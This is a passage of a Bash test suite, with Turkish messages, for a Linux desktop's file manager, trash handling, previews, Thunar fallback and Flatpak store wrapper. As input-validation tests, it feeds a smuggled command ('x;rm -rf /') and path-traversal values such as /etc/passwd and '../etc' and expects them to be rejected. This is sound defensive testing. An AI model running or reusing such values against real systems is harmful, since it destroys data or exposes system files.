fe copy "$fh/Desktop" "$fh/Documents/alt" >/dev/null && [ -d "$fh/Desktop/alt" ] && ok "copy: klasör kopyalanır" || bad "klasör kopyalama"
mkdir -p "$fh/Documents/alt/iç"; fe copy "$fh/Documents/alt/iç" "$fh/Documents/alt" 2>&1 | grep -q 'kendi içine' && ok "copy: klasör kendi içine kopyalanamaz" || bad "klasör kendi içine kopyalandı"
fe move "$fh/Desktop" "$fh/Downloads/Rapor.PDF" >/dev/null; [ -f "$fh/Desktop/Rapor.PDF" ] && [ ! -f "$fh/Downloads/Rapor.PDF" ] && ok "move: dosyayı taşır" || bad "move"
fe move "$fh/Desktop" "$fh/Documents" 2>&1 | grep -q 'Korunan' && fe copy /etc "$fh/Desktop/Rapor.PDF" 2>&1 | grep -q 'geçersiz' && ok "move: korunan kaynak ve sistem hedefi reddedilir" || bad "move/copy korumaları"
mkdir -p "$fh/Documents/alt/derin"; echo q > "$fh/Documents/alt/derin/RAPOR_son.txt"
sr=$(fe search "$fh" rapor | cut -f2); grep -q 'RAPOR_son.txt' <<<"$sr" && grep -q 'Rapor.PDF' <<<"$sr" && ok "search: büyük/küçük harf ayırmadan alt klasörlerde arar" || bad "search: $sr"
[ "$(fe search "$fh" gizli | wc -l)" = 0 ] && [ "$(fe search "$fh" gizli --hidden | wc -l)" -ge 1 ] && ok "search: gizli dosyalar yalnızca --hidden ile" || bad "search --hidden"
fe info "$fh/Documents/Rapor.PDF" | grep -q '^boyut=' && ok "info: boyut/izin/sahip alanları" || bad "info"
fe delete "$fh/Desktop/Rapor.PDF" >/dev/null && [ ! -e "$fh/Desktop/Rapor.PDF" ] && fe trashempty >/dev/null && [ "$(fe trashlist | wc -l)" = 0 ] && ok "delete kalıcı siler; trashempty çöpü boşaltır" || bad "delete/trashempty"
rm -rf "$TF"

section "Dosyalar: disk çöpü, önizleme, Thunar'a geri dönüş, varsayılan klasör uygulaması"
FB="$BIN/schway-files"
TD=$(mktemp -d); dh="$TD/home"; mkdir -p "$dh/Documents" "$dh/.config" "$TD/media/FLASH" "$TD/media/DISK2"
printf '36 28 0:30 / %s/media/FLASH rw - vfat /dev/sdb1 rw\n37 28 0:31 / %s/media/DISK2 rw - ext4 /dev/sdc1 rw\n' "$TD" "$TD" > "$TD/mi"
fd() { HOME="$dh" XDG_DATA_HOME="$dh/.local/share" XDG_CONFIG_HOME="$dh/.config" SCHWAY_FILES_REMOVABLE_ROOTS="$TD/media" SCHWAY_FILES_MOUNTINFO="$TD/mi" python3 "$FB" "$@"; }
echo "usb" > "$TD/media/FLASH/foto.txt"; mkdir -p "$TD/media/FLASH/albüm"; echo x > "$TD/media/FLASH/albüm/a.txt"; echo ev > "$dh/Documents/ev.txt"
fd trash "$TD/media/FLASH/foto.txt" "$TD/media/FLASH/albüm" >/dev/null
ut="$TD/media/FLASH/.Trash-$(id -u)"
[ -f "$ut/files/foto.txt" ] && [ -d "$ut/files/albüm" ] && [ ! -e "$TD/media/FLASH/foto.txt" ] && ok "disk çöpü: USB'deki dosya diskin kendi .Trash-UID klasörüne gider (ev çöpüne kopyalanmaz)" || bad "USB dosyası yanlış çöpe gitti"
grep -q '^Path=foto.txt$' "$ut/info/foto.txt.trashinfo" && ok "disk çöpünde Path diskin köküne göredir (FreeDesktop 'topdir' kuralı)" || bad "disk çöpü Path biçimi: $(cat "$ut/info/foto.txt.trashinfo")"
fd trash "$dh/Documents/ev.txt" >/dev/null; [ -f "$dh/.local/share/Trash/files/ev.txt" ] && ok "ev dosyası ev çöpüne gider" || bad "ev dosyası çöpü"
tl=$(fd trashlist); [ "$(awk -F'\t' 'NF==7' <<<"$tl" | wc -l)" = 3 ] && grep -q $'\tfoto.txt$' <<<"$tl" && ok "trashlist: ev + disk çöpü birleşik, 7 sütun (kimlik, yol, tarih, boyut, tür, cins, görünen ad)" || bad "trashlist: $tl"
id=$(awk -F'\t' '$7=="foto.txt"{print $1}' <<<"$tl"); [[ $id == /* ]] && ok "disk çöpü öğesinin kimliği mutlak yoldur, ev çöpününki ad" || bad "kimlik: $id"
fd restore "$id" >/dev/null; [ -f "$TD/media/FLASH/foto.txt" ] && ok "restore: disk çöpündeki öğe diskte özgün yerine döner" || bad "disk restore"
for bad_id in /etc/passwd ../x "$dh/.local/share/Trash/files/../../../x" ""; do fd restore "$bad_id" >/dev/null 2>&1 && bad "geçersiz çöp kimliği kabul edildi: '$bad_id'"; done; ok "geçersiz/yol aşan çöp kimlikleri reddedilir"
fd rename "$ut/files/albüm" x >/dev/null 2>&1 && bad "disk çöpünün içi değiştirilebildi"; fd trash "$ut" >/dev/null 2>&1 && bad ".Trash-UID çöpe atılabildi"; fd copy "$ut/files" "$TD/media/FLASH/foto.txt" >/dev/null 2>&1 && bad "çöpe kopyalama yapılabildi"; ok "her iki çöpün içi de korunur (rename/trash/copy reddedilir)"
fd trashempty >/dev/null; [ -z "$(ls -A "$ut/files")" ] && [ "$(fd trashlist | wc -l)" = 0 ] && ok "trashempty ev + disk çöplerini boşaltır" || bad "trashempty disk çöpünü boşaltmadı"
# önizleme
printf 'satır 1\nsatır 2 ğüşiöç\n' > "$dh/a.txt"; printf '#!/bin/sh\necho x\n' > "$dh/betik"; chmod +x "$dh/betik"; python3 -c "open('$dh/x.bin','wb').write(bytes(range(256))*20)"; mkdir "$dh/kl"; touch "$dh/kl/1" "$dh/kl/2"; : > "$dh/bos.txt"; head -c 200000 /dev/zero | tr '\0' 'a' > "$dh/uzun.txt"; touch "$dh/v.mkv"
python3 - "$dh" <<'EOF'
import sys
from PySide6.QtGui import QImage, QColor
im = QImage(8, 8, QImage.Format_RGB32); im.fill(QColor("#336699")); im.save(sys.argv[1] + "/p.png")
EOF
pvw() { fd preview "$dh/$1"; }
pvw a.txt | grep -q '^kind=text$' && pvw a.txt | grep -q 'ğüşiöç' && pvw a.txt | grep -q '^detail=2 satır$' && ok "preview: metin (UTF-8, satır sayısı)" || bad "preview metin"
pvw betik | grep -q '^kind=text$' && ok "preview: uzantısız çalıştırılabilir betik metin sayılır (içeriğe bakılır)" || bad "preview betik"
pvw x.bin | grep -q '^kind=binary$' && ! pvw x.bin | sed -n '/^@@$/,$p' | grep -q 'ÿ' && ok "preview: ikili dosyanın içeriği basılmaz" || bad "preview ikili"
[ -f "$dh/p.png" ] && pvw p.png | grep -q '^kind=image$' || skip "PNG üretilemedi (PySide6 yok): resim preview atlandı"
pvw kl | grep -q '^kind=dir$' && pvw kl | grep -q '^detail=2 öğe$' && ok "preview: klasör (öğe sayısı)" || bad "preview klasör"
pvw v.mkv | grep -q '^kind=other$' && pvw v.mkv | grep -q '^detail=video$' && ok "preview: video/ses/arşiv için bilgi (içerik yok)" || bad "preview video"
[ "$(pvw uzun.txt | wc -c)" -lt 20000 ] && pvw uzun.txt | grep -q '^detail=1 satır+$' && ok "preview: büyük dosya kısaltılır ('+' işareti), bellek şişmez" || bad "preview uzun dosya"
pvw bos.txt | grep -q '^kind=text$' && ok "preview: boş dosya" || bad "preview boş"
fd preview "$dh/yok" 2>&1 | grep -q 'Bulunamadı' && ok "preview: olmayan yol Türkçe hata verir" || bad "preview hata"
# gui: URI + geri dönüş
mkdir -p "$TD/g/src" "$TD/g/qml" "$TD/g/pa" "$TD/g/pb" "$TD/g/pc" "$dh/boş luk/ç"; echo 'ShellRoot{}' > "$TD/g/src/shell.qml"; echo 'singleton Theme Theme.qml' > "$TD/g/src/qmldir"; echo x > "$TD/g/qml/Theme.qml"
printf '#!/bin/bash\necho "THUNAR: $*" >> %s/g/calls.log\n' "$TD" > "$TD/g/pa/thunar"; cp "$TD/g/pa/thunar" "$TD/g/pb/thunar"; cp "$TD/g/pa/thunar" "$TD/g/pc/thunar"
printf '#!/bin/bash\nexit 1\n' > "$TD/g/pa/qs"; printf '#!/bin/bash\necho "QS: START=$SCHWAY_FILES_START" >> %s/g/calls.log\nsleep 3\n' "$TD" > "$TD/g/pb/qs"; chmod +x "$TD"/g/p?/*
gg() { HOME="$dh" SCHWAY_FILES_SRC="$TD/g/src" SCHWAY_FILES_QML="$TD/g/qml" SCHWAY_FILES_RUN="$TD/g/run" SCHWAY_FILES_GUI_WAIT=2 PATH="$1:/usr/bin:/bin" python3 "$FB" gui "${@:2}"; }
gg "$TD/g/pa" "file://$dh/bo%C5%9F%20luk/%C3%A7"; sleep 0.4
grep -q "THUNAR: $dh/boş luk/ç" "$TD/g/calls.log" && ok "gui: file:// URI çözülür (boşluk, Türkçe harf); qs çökerse Thunar'a geçilir" || bad "gui çökme geri dönüşü: $(cat "$TD/g/calls.log" 2>/dev/null)"
rm -f "$TD/g/calls.log"; gg "$TD/g/pb" "$dh/Documents"; sleep 0.4
grep -q "QS: START=$dh/Documents" "$TD/g/calls.log" && ! grep -q THUNAR "$TD/g/calls.log" && ok "gui: qs çalışırsa Thunar çağrılmaz, başlangıç klasörü ortamdan geçer" || bad "gui normal başlatma: $(cat "$TD/g/calls.log" 2>/dev/null)"
rm -f "$TD/g/calls.log"; gg "$TD/g/pb" "$dh/a.txt"; sleep 0.4; grep -q "QS: START=$dh\$" "$TD/g/calls.log" && ok "gui: dosya yolu verilirse üst klasörü açılır" || bad "gui dosya yolu"
rm -f "$TD/g/calls.log"; PATH="$TD/g/pc" HOME="$dh" "$(command -v python3)" "$FB" gui "$dh" ; grep -q "THUNAR: $dh" "$TD/g/calls.log" && ok "gui: qs hiç yoksa Thunar açılır" || bad "gui qs yok"
PATH=/nonexistent HOME="$dh" "$(command -v python3)" "$FB" gui 2>&1 | grep -q 'Thunar da kurulu değil' && ok "gui: ne qs ne Thunar varsa açık hata verir" || bad "gui son hata"
DF="$A/usr/share/applications/schway-files.desktop"
grep -q '^MimeType=inode/directory;' "$DF" && grep -q '^Exec=schway-files gui %U$' "$DF" && grep -q '^inode/directory=schway-files.desktop' "$A/etc/skel/.config/mimeapps.list" && ok "Schway Dosyalar klasörler için varsayılan uygulama (skel mimeapps.list, MimeType, %U)" || bad "varsayılan klasör uygulaması ayarı"
grep -q 'ALT, E, exec, thunar' "$A/etc/skel/.config/hypr/hyprland.conf" && grep -qiE '^thunar' packages.extra && ok "Thunar paketi kurulu kalır ve Super+Alt+E ile yedek olarak açılır" || bad "Thunar yedeği eksik (paket ya da kısayol)"
rm -rf "$TD"

section "Görev Yöneticisi ve Dosyalar arayüzü (ekran görüntüsü + sözleşme)"
if python3 -c "import PySide6" >/dev/null 2>&1; then
    T11=$(mktemp -d)
    timeout 300 python3 tests/qml/shots/render_apps.py "$T11" Tasks Files >"$T11/r.log" 2>&1 && ok "Görev Yöneticisi (3 sekme) ve Dosyalar (ev, çöp, iletişim kutusu) QML hatasız çizilir" || { bad "uygulama render"; tail -6 "$T11/r.log"; }
    n=$(find "$T11" -name '*.png' -size +20k | wc -l); [ "$n" -ge 6 ] && ok "6 ekran görüntüsü üretildi, boş değil" || bad "ekran görüntüsü sayısı: $n"
    timeout 300 python3 tests/qml/shots/contract_apps.py >"$T11/c.log" 2>&1 && ok "arayüz <-> arka uç sözleşme testi: $(grep -c '^  ok' "$T11/c.log") denetim geçti (komutlar gerçek arka uçta çalıştırıldı)" || { bad "sözleşme testi"; grep HATA "$T11/c.log"; }
    rm -rf "$T11"
else skip "PySide6 kurulu değil: Görev Yöneticisi/Dosyalar render ve sözleşme testleri atlandı"; fi

section "Mağaza (Flatpak / Flathub)"
T5=$(mktemp -d)
cat > "$T5/flatpak" <<'EOS'
#!/bin/bash
echo "flatpak $*" >> "$FPLOG"
case "$1" in
  remotes) echo flathub ;;
  search) printf 'org.videolan.VLC\tVLC\tMedia player\ngecersiz\tx\ty\n' ;;
  list) printf 'org.mozilla.firefox\tFirefox\t130.0\n' ;;
esac
EOS
chmod +x "$T5/flatpak"; : > "$T5/log"
st() { SCHWAY_FLATPAK=$T5/flatpak FPLOG=$T5/log HOME=$T5 bash "$BIN/schway-store" "$@"; }
[ "$(st featured | wc -l)" -ge 10 ] && ok "öne çıkanlar listesi dolu" || bad "featured boş"
[ "$(st search vlc)" = "$(printf 'S\torg.videolan.VLC\tVLC\tMedia player')" ] && ok "arama: geçerli kimlik listelenir, geçersiz satır elenir" || bad "arama çıktısı yanlış"
st install org.videolan.VLC >/dev/null 2>&1; grep -q 'install --user -y --noninteractive flathub org.videolan.VLC' "$T5/log" && ok "kurulum --user (yönetici izni gerekmez)" || bad "install komutu yanlış"
for bad_id in 'x;rm -rf /' 'foo' '../etc' '--help' 'a b.c'; do
    st install "$bad_id" >/dev/null 2>&1 && bad "geçersiz kimlik kabul edildi: $bad_id" || ok "geçersiz kimlik reddedilir: $bad_id"
done
st remove org.videolan.VLC >/dev/null 2>&1; grep -q 'uninstall --user -y --noninteractive org.videolan.VLC' "$T5/log" && ok "kaldırma komutu doğru" || bad "remove komutu yanlış"
for f in shell.qml qmldir; do [ -f "$A/usr/share/schway/store/$f" ] && ok "mağaza arayüzü: $f" || bad "mağaza arayüzü eksik: $f"; done
[ -f "$A/usr/share/applications/schway-store.desktop" ] && ok "Mağaza uygulama menüsünde" || bad "schway-store.desktop yok"
grep -qx flatpak packages.extra && ok "flatpak paket listesinde" || bad "flatpak eksik"
if python3 -c "import PySide6" >/dev/null 2>&1; then
    timeout 120 python3 tests/qml/run_store.py "$A/usr/share/schway/store" "$A/etc/skel/.config/quickshell/Theme.qml" >"$T5/qml.log" 2>&1 && ok "Mağaza arayüzü Qt'de çalıştırıldı: sekmeler, arama, kurma/kaldırma/hata akışı (sahte Quickshell ile)" || { bad "Mağaza arayüz testi"; tail -15 "$T5/qml.log"; }
else skip "PySide6 kurulu değil, arayüz çalıştırma testi atlandı (pip install PySide6-Essentials)"; fi
rm -rf "$T5"

section "Geri bildirim merkezi (Node testleri)"
if command -v node >/dev/null; then
    ( cd feedback-center && node --test test.js >"$T/node.log" 2>&1 ) && ok "feedback-center: node --test" || { bad "feedback-center testleri"; tail -20 "$T/node.log"; }
else skip "node kurulu değil"; fi

printf '\nSonuç: %d geçti, %d hata, %d atlandı\n' "$PASS" "$FAIL" "$SKIP"
[ "$FAIL" -eq 0 ]
